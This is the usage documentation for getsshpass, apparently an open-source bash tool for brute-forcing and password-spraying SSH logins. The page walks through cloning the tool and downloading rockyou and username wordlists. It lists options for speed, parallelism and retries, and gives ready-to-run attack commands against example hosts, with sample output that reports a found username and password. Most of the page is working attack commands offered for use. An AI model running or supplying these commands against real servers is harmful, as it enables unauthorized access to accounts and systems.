# Usage

This page covers getting getsshpass running: the steps to install it and pull down a couple of wordlists, the full list of command-line options, and worked examples ranging from a basic run to password spraying. If you just want to launch an attack, follow the four steps below; the [Options](#options) and [Examples](#examples) sections fill in the details.

**Contents**

- [Steps](#steps)
  - [1. Clone the repository](#1-clone-the-repository)
  - [2. Make the script executable](#2-make-the-script-executable)
  - [3. Download a users list](#3-download-a-users-list)
  - [4. Download a passwords list](#4-download-a-passwords-list)
  - [5. Launch the attack](#5-launch-the-attack)
- [Options](#options)
- [Examples](#examples)
- [Example output](#example-output)

---

## Steps

Five steps take you from cloning the repository to launching an attack:

### 1. Clone the repository

```bash
git clone https://github.com/blaipr/getsshpass.git
cd getsshpass/src
```

### 2. Make the script executable

```bash
chmod +x getsshpass.sh
```

### 3. Download a users list

```bash
./getsshpass.sh --fetch top-usernames
```

### 4. Download a passwords list

```bash
./getsshpass.sh --fetch rockyou
```

### 5. Launch the attack

```bash
./getsshpass.sh -a <host> -u top-usernames-shortlist.txt -d rockyou.txt
```

---

## Options

`getsshpass.sh` has both short and long options forms:

```
Usage: getsshpass.sh [OPTIONS]

OPTIONS:
   -a, --attack HOST      IP address or hostname of target SSH host
   -p, --port PORT        TCP port 1-65535 of target SSH host [default: 22]
   -u, --users FILE       Path to file with usernames (repeatable)
   -d, --dictionary FILE  Path to file with passwords (repeatable)
   -w, --wait SECS        Delay between attempts in seconds (e.g. 1, 0.1, 0.0) [default: 0.04]
   -j, --jobs JOBS        Maximum parallel SSH attempts, 0 = unlimited [default: 0]
   -r, --retries N        Max retries per attempt on transient SSH errors [default: 50]
   -t, --timeout SECS     SSH connection timeout in seconds [default: 8]
   -c, --clear            Clear all state files (results, resume, filtered users)
   -f, --fetch NAME       Download a wordlist (top-usernames, rockyou, 10k, 100k)
   -l, --list             List available wordlists
   -s, --sshpass          Use sshpass instead of SSH_ASKPASS (requires sshpass)
   -v, --version          Display version
   -h, --help             Display help
```

---

## Examples

Basic usage:

```bash
./getsshpass.sh -a 192.168.1.1 -p 22 -u users.txt -d passwords.txt
```

With hostname, slower delay, and limited parallelism:

```bash
./getsshpass.sh -a server.local -p 22 -u users.txt -d passwords.txt -w 0.5 -j 3
```

Maximum speed (no delay between attempts):

```bash
./getsshpass.sh -a 10.0.0.5 -u users.txt -d passwords.txt --wait 0.0
```

Multiple wordlist files (concatenated in order):

```bash
./getsshpass.sh -a 192.168.1.1 -u admins.txt -u users.txt -d common.txt -d rockyou.txt
```

Password spray (try each password across all users before moving to the next):

```bash
./getsshpass.sh -a 192.168.1.1 -d rockyou.txt -u users.txt
```

Non-default SSH port:

```bash
./getsshpass.sh -a 192.168.1.1 -p 2222 -u users.txt -d rockyou.txt
```

IPv6 target (bracket-wrapping is handled automatically):

```bash
./getsshpass.sh -a 2001:db8::1 -u users.txt -d rockyou.txt
```

sshpass mode instead of the default SSH_ASKPASS (requires `sshpass`):

```bash
./getsshpass.sh -a 192.168.1.1 -u users.txt -d rockyou.txt -s
```

---

## Example output

```
$ ./getsshpass.sh -a 192.168.1.1 -p 22 -u users.txt -d passwords.txt -j 5
2026-05-10 14:23:44 [INFO ] Target:              192.168.1.1:22
2026-05-10 14:23:44 [INFO ] SSH method:          SSH_ASKPASS
2026-05-10 14:23:44 [INFO ] SSH parallel jobs:   max 5
2026-05-10 14:23:44 [INFO ] SSH delay:           0.04s
2026-05-10 14:23:44 [INFO ] SSH timeout:         8s
2026-05-10 14:23:44 [INFO ] SSH retries:         50
2026-05-10 14:23:44 [INFO ] Users file:          users.txt
2026-05-10 14:23:44 [INFO ] Passwords file:      passwords.txt
2026-05-10 14:23:44 [INFO ] Attack order:        users first
2026-05-10 14:23:44 [INFO ] Checking SSH connection to '192.168.1.1:22'...
2026-05-10 14:23:46 [OK   ] Connection successful
2026-05-10 14:23:46 [INFO ] Filtering users by password authentication...
2026-05-10 14:23:51 [INFO ] 3/4 users allow password authentication
2026-05-10 14:23:51 [INFO ] Users:                       3 / 4
2026-05-10 14:23:51 [INFO ] Passwords:                   4
2026-05-10 14:23:51 [INFO ] Combinations:                12
2026-05-10 14:23:51 [INFO ] Starting attack...
2026-05-10 14:23:52 [INFO ] Passwords tried:             9
2026-05-10 14:23:52 [INFO ] Passwords remaining:         3
2026-05-10 14:24:01 [OK   ] Found username: 'deploy' and password: '123456'
2026-05-10 14:24:01 [INFO ] Elapsed time: 16s
```

The current attempt overwrites in place (`\r`), so only the last tried combination is visible as a scrolling line below the counter rows. The `Passwords tried` and `Passwords remaining` lines are pinned immediately after `Starting attack...` and update live with every attempt. A progress bar showing percentage and count is pinned at the very bottom row of the terminal throughout the attack. When output is piped or redirected (non-terminal), colors and the pinned display are disabled and each attempt is printed as a plain `[count/total]` line instead.

If no password is found after exhausting all combinations:

```
2026-05-10 14:27:21 [WARN ] Password not found. Try a different dictionary.
2026-05-10 14:27:21 [INFO ] Elapsed time: 3m 29s
```

---

[← Back to the README](../README.md)
